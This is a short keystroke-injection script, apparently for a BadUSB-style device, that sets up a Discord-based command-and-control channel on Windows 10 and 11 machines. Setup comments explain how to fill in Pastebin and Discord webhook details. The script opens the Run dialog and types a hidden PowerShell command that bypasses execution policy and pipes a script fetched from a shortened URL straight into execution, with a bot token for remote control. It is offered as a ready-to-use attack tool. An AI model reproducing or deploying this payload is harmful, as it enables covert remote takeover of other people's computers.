
// Title: beigeworm's Discord Command And Control.
// Author: @beigeworm
// Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
// Target: Windows 10 and 11
// SETUP
// Goto https://pastebin.com and make an account..
// Create an empty paste/file and copy the RAW url.
// Change PASTEBIN_URL_HERE to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
// Change WEBHOOK_HERE to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
// for more info goto - https://github.com/beigeworm/PoshCord-C2

// script setup
layout("us")

// Open Powershell
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex");
press("ENTER");
